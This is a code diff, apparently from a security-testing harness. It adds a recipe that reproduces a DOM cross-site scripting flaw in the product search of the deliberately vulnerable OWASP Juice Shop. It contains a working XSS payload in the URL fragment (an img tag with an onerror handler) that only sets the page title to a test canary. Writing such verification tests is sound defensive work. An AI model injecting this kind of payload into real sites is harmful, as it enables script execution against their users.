@@ -239,10 +239,52 @@ function loginBypassRecipe(config: JuiceShopConfig): ReproductionRecipe {
   };
 }
 
+/**
+ * Juice Shop's search view renders the `q` route parameter into the page with
+ * `bypassSecurityTrustHtml` and an `[innerHTML]` binding (the localXssChallenge), so a payload in
+ * the search route executes in the DOM. The route is hash based (`/#/search?q=...`), so `q` and its
+ * payload live in the URL fragment, which the browser never sends to the server. That is what the
+ * browser oracle needs: the canary reaches the page only through the fragment and the sink is
+ * `document.title`, which only script can set, so the canary landing in the title proves the DOM
+ * sink executed, not that the server reflected a value.
+ *
+ * Verified against the pinned v17.3.0 image: the exploit payload sets the title to the run canary,
+ * and the inert negative control leaves it as "OWASP Juice Shop". The path is "/" (the app shell);
+ * the whole client route rides in hashPayload after the fragment marker.
+ */
+function domXssSearchRecipe(): ReproductionRecipe {
+  return {
+    id: "juice-shop-dom-xss-search",
+    title: "DOM XSS in the client-side product search",
+    keywords: [
+      "xss",
+      "dom xss",
+      "cross-site scripting",
+      "client-side",
+      "product search",
+      "search",
+    ],
+    // Required by the type but unused on the browser path: reproduce.ts runs browserExploit in
+    // place of the HTTP fixture/negativeControl/exploit legs (see its doc on ReproductionRecipe).
+    fixture: { request: { method: "POST", path: "/unused", body: {} } },
+    negativeControl: { method: "GET", path: "/unused" },
+    exploit: { method: "GET", path: "/unused" },
+    oracleCheck: () => false,
+    browserExploit: {
+      sink: "title",
+      negativeControl: { path: "/", hashPayload: "/search?q=plain-{{canary}}" },
+      exploit: {
+        path: "/",
+        hashPayload: `/search?q=<img src=x onerror="document.title='{{canary}}'">`,
+      },
+    },
+  };
+}
+
 export const getRecipesForTarget: GetRecipesForTargetFn = (target) => {
   if (target.name === "juice-shop-v17.3.0") {
     if (!isJuiceShopConfig(target.config)) return [];
-    return [sqliSearchRecipe(target.config), loginBypassRecipe(target.config)];
+    return [sqliSearchRecipe(target.config), loginBypassRecipe(target.config), domXssSearchRecipe()];
   }
   // Every other onboarding target dispatches through its own module, so juice-shop's frozen
   // recipes above stay untouched. See lib/targets/recipes.additional.ts.
